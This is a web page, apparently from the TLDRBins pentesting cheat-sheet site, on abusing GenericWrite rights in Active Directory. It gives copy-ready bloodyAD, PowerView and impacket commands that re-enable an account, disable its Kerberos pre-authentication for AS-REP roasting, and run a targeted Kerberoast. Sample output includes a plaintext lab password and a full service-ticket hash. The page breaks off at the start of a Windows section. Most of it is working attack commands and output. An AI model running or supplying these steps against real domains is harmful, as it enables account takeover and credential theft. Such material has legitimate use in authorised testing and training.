<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<meta name="description" content="">
<title>GenericWrite | TLDRBins</title>
<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
</head>
<body>
<header>
  <h1>
    <a href="https://tldrbins.github.io/">
      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
      <span>TLDRBins</span>
    </a><span class="hl"> / </span>
    <a href="https://tldrbins.github.io/genericwrite/"><span>GenericWrite</span></a></h1>
  <div class="theme-toggle-wrapper">
    <div class="theme-toggle">
      <div class="theme-toggle-track">
        <div class="theme-toggle-track-dark">
          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
        </div>
        <div class="theme-toggle-track-light">
          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
        </div>
      </div>
      <div class="theme-toggle-thumb"></div>
      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
    </div>
  </div>
  <style>
  .theme-toggle-wrapper, .theme-toggle {
      margin: 0;
      padding: 0;
      border: 0;
      box-sizing: border-box;
  }

  .theme-toggle-wrapper {
      display: table;
      float: right;
      margin-left: auto;
  }

  .theme-toggle {
      touch-action: pan-x;
      display: inline-block;
      position: relative;
      cursor: pointer;
      background-color: transparent;
      user-select: none;
  }

  .theme-toggle-screenreader-only {
      position: absolute;
      width: 1px;
      height: 1px;
      margin: -1px;
      padding: 0;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
  }

  .theme-toggle-track {
      width: 50px;
      height: 24px;
      border-radius: 30px;
      background-color: hsl(223, 61%, 44%);
      transition: background-color 0.2s ease;
  }

  .theme-toggle-track-dark,
  .theme-toggle-track-light {
      position: absolute;
      width: 17px;
      height: 17px;
      top: 50%;
      transform: translateY(-50%);
      transition: opacity 0.25s ease;
  }

  .theme-toggle-track-dark {
      left: 5px;
      opacity: 0;
  }

  .theme-toggle--checked .theme-toggle-track-dark {
      opacity: 1;
  }

  .theme-toggle-track-light {
      right: 5px;
      opacity: 1;
  }

  .theme-toggle--checked .theme-toggle-track-light {
      opacity: 0;
  }

  .theme-toggle--checked .theme-toggle-track {
      background-color: hsl(222, 14%, 7%);
  }

  .theme-toggle-thumb {
      position: absolute;
      top: 1px;
      left: 1px;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      background-color: #fafafa;
      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
  }

  .theme-toggle--checked .theme-toggle-thumb {
      transform: translateX(26px);
  }
  </style>
  <script>
      const body = document.body;
      const themeSwitcher = document.querySelector('.theme-toggle');      

      themeSwitcher.addEventListener('click', () => {
          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
          body.classList.toggle('dark-mode', isDarkMode);
          if (isDarkMode) {
              localStorage.setItem('darkMode', 'true');
          } else {
              localStorage.removeItem('darkMode');
          }
      });      

      if (localStorage.getItem('darkMode')) {
          themeSwitcher.classList.add('theme-toggle--checked');
          body.classList.add('dark-mode');
      }
  </script>
  <p class="desc"></p>
</header>
<main>
<ul class="tagsList single">
  <li><a href="https://tldrbins.github.io/@shadow-credentials/">Shadow Credentials</a></li>
  <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
  <li><a href="https://tldrbins.github.io/@kerberoasting/">Kerberoasting</a></li>
  <li><a href="https://tldrbins.github.io/@genericwrite/">Genericwrite</a></li>
  <li><a href="https://tldrbins.github.io/@powerview/">Powerview</a></li>
  <li><a href="https://tldrbins.github.io/@asreproast/">Asreproast</a></li>
  <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
  <li><a href="https://tldrbins.github.io/@disabled-account/">Disabled Account</a></li>
</ul>
<hr>
<div class="content">
  <div class="tips">
  <p><strong>Usage Tips:</strong></p>
  <ul>
    <li>Click on a keyword to enable inline editing.</li>
    <li>Click inside a code block to copy (excludes comments).</li>
    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
    <li>Click outside to collapse all examples.</li>
  </ul>
</div>
  <div id="dynamicFormContainer">
	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="COM">COM: </label><input type="text" name="COM"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="EXAMPLE">EXAMPLE: </label><input type="text" name="EXAMPLE"></div><div class="input-group"><label for="GROUP">GROUP: </label><input type="text" name="GROUP"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SERVICE_PORT">SERVICE PORT: </label><input type="text" name="SERVICE_PORT"></div><div class="input-group"><label for="SERVICE">SERVICE: </label><input type="text" name="SERVICE"></div><div class="input-group"><label for="TARGET_COMPUTER">TARGET COMPUTER: </label><input type="text" name="TARGET_COMPUTER"></div><div class="input-group"><label for="TARGET_DOMAIN">TARGET DOMAIN: </label><input type="text" name="TARGET_DOMAIN"></div><div class="input-group"><label for="TARGET_GROUP">TARGET GROUP: </label><input type="text" name="TARGET_GROUP"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
	<div class="buttons center">
		<button id="form_btn">Show Inspector</button>
		<button id="replace_btn" style="display: none;">Replace Params</button>
		<button id="reset_btn" style="display: none;">Reset</button>
		<button id="clear_btn" style="display: none;">Clear Cache</button>
	</div>
</div>
  <h3 id="abuse-1--add-uf_dont_require_preauth-bit-to-target-user">Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User</h3>
<p class="tabs">
<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set1" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-enable-account-optional">1. Enable Account [Optional]</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; bloodyAD --host <span class="o editable-keyword">&lt;DC&gt;</span> -d "<span class="o editable-keyword">&lt;DOMAIN&gt;</span>" --dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -k remove uac <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -f ACCOUNTDISABLE
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-add-uf_dont_require_preauth-bit">2. Add UF_DONT_REQUIRE_PREAUTH bit</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; bloodyAD --host <span class="o editable-keyword">&lt;DC&gt;</span> -d "<span class="o editable-keyword">&lt;DOMAIN&gt;</span>" --dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -k add uac <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -f DONT_REQ_PREAUTH
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; . .\PowerView.ps1
</span></span></span><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
</span></span></span></div></pre></div><h4 id="2-check-target-user">2. Check Target User</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainUser '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' | ConvertFrom-UACValue
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainUser 'user' | ConvertFrom-UACValue
</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainUser 'user' | ConvertFrom-UACValue
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Name                           Value                                           
</span></span></span><span class="line"><span class="cl"><span class="go">----                           -----                                           
</span></span></span><span class="line"><span class="cl"><span class="go">NORMAL_ACCOUNT                 512
</span></span></span></div></pre></div><h4 id="3-create-a-cred-object-runas-optional">3. Create a Cred Object (runas) [Optional]</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>'</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-add-uf_dont_require_preauth-bit">4. Add UF_DONT_REQUIRE_PREAUTH bit</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -C
</span></span></span><span class="line"><span class="cl"><span class="go">Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-Domain] Extracted domain 'corp.local' from -Credential
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainSearcher] search base: 
</span></span></span><span class="line"><span class="cl"><span class="go">LDAP://DC01.corp.local/DC=corp,DC=local
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
</span></span></span><span class="line"><span class="cl"><span class="go">(&amp;(|(|(samAccountName=user)(name=user)(displayname=user))))
</span></span></span><span class="line"><span class="cl"><span class="go">VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for 
</span></span></span><span class="line"><span class="cl"><span class="go">object 'user'
</span></span></span></div></pre></div><h4 id="5-as-rep-roasting-from-linux">5. AS-REP Roasting (From Linux)</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -no-pass -dc-ip <span class="o editable-keyword">&lt;DC&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers <span class="s1">'corp.local/user'</span> -no-pass -dc-ip 172.16.1.5
</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting TGT for user
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$user</span>@CORP.LOCAL:642ec7b699 ---<span class="o">[</span>SNIP<span class="o">]</span>--- e70950229f
</span></span></div></pre></div></div></div>

<p></p>
<hr>
<h3 id="abuse-2--targeted-kerberoast">Abuse #2 : Targeted Kerberoast</h3>
<p class="tabs">
<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set2" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">python3 targetedKerberoast.py -v -d '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' --dc-ip '<span class="o editable-keyword">&lt;DC_IP&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> python3 targetedKerberoast.py -v -d <span class="s1">'ADMINISTRATOR.HTB'</span> -u <span class="s1">'emily'</span> -p <span class="s1">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span> --dc-ip <span class="s1">'10.129.255.215'</span>
</span></span><span class="line"><span class="cl"><span class="go">[*] Starting kerberoast attacks
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Fetching usernames from Active Directory with LDAP
</span></span></span><span class="line"><span class="cl"><span class="go">[VERBOSE] SPN added successfully for (ethan)
</span></span></span><span class="line"><span class="cl"><span class="go">[+] Printing hash for (ethan)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>ethan<span class="nv">$ADMINISTRATOR</span>.HTB<span class="nv">$ADMINISTRATOR</span>.HTB/ethan*<span class="nv">$719</span>ae93a160c94f2c6d7177cee77e7fb<span class="nv">$5181256049</span>f460e6bf16edef0850de21dc667b92081510623af531d8595c094d16038a9ce3cce9f073cf0aa1af4e622e87a44455724f6ef0c5aeb8e26f0c88b07712bc1cdbf34f7019c7a2b2397cd998db1e488b31bf51ebd2f9b6fde668d9713a4a7039e7cc02804e5493d95bac27bec7e8531e40d5afeb87523cf0c0d647b8b83d5fb29ad58f43a19f9c9f5d57b4429d817ea966c3296997b1241ba0c13fff9ec4d05c312db763f351f55bb76bddcf7e21ef284a8f4e84ea63ce377ae098a370c5ffe5b676116ca2d8fe2beec46af5d03ce8c6dd913e4dae37276153cfaf4e69d7e4ea2bdded3f75b3a51b8c57b408b332dc6878326b0276d85e5ff64a2dadbbd761e9f1346db7ab9cb8ac27afc819e89a5228b9bca828f3e1f360990cd60e3465e853347bcf425e8b713a40e3df276456b3ffd98a6ecc2daba5857055489f980725aa1d94cab0efff2b48cb115ea0b210865c5b938669c469d9d9c155af141044069780ff5ab1289d9f1b49e567a8162b4db28bd366a810c25b9164bd40a495172bf0b67ce52ff69b0f01d4bdfb37610bf19400d67c43efedbe4f24a5ce328758acdfc3f0ce6fc23548bb43e2c7f12d50e7a88ee61c64fabd03987102325f8a6d7a3a2a0ce480e0e2496ff72d4839ab3552053c8275debfbc005011b4bc0f9ffe50696aaba045e298712e4794e437fe6fe38f4b1bf1d4d48fca08721929a865021044bc5bd427a3a4fda1b0fc00d0ac6462e0a421600f3007f8b7976bd33a5ee9fa701d078a7f3f3b3417d025029a12e9155377bf17e8a64ddfb61f23752122e8094a7064c9aae2da4ada73e34ff2c24f3f83239057910e42abc14ad0a2bb7986971b21d8efadf205a12ac5379552d28dc6781fced2699a8b086d82ed5ff96a1bf34491707850533f550b287b34b486526f3008e5bd19b03cd6fad3f0a4cde95294525f4422abd90b7f4c51ecfc0590a74c50e71406be843371877385079796fdfbef564a3bc76cd14c2351614d8e07767997027aabc27e7132976691bfe6229b935d78922e7439fedeff25f58b2a06e24549a6b95913d267371e79f632f4c34b42de9bbd058102f36b790bcb376ed3ef528c5dca3daeaa474e627a23079e1d2e97bc152e87967253b958a76c41e814c9bebe93ff157ee326e29916a137dbc957c4c965d2e717f1aac0be2d6e2f9b8cf2d143d540484a68454580572fd054010102dbdefd1f21f9c2748d0bd314224c22de492e754285c0379894f4573583539bd74c0afe912114d8154bad5cf28cdf0983a0819a609981ff54285ca4d60abed3c4aa2c3536a4830142f614770a9aa93fff4ea8ae2344b0657ae11912b7301cc6555e71ba9e958c15d862de3f09e069b477044a09c66835908fb4423bff92f23fd2bf4b93f305bef94abc159cba3568dc1808228794d5a85afaaa4ad39d515772491856ed28abdb36901edf1f2f8d70fc15a089a543a70db0e2800a757af8a8312551e91e3996728e1e0139acfafae76f4943cef96632054ab598d1d15d
</span></span><span class="line"><span class="cl"><span class="go">[VERBOSE] SPN removed successfully for (ethan)
</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a></em></small></p></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
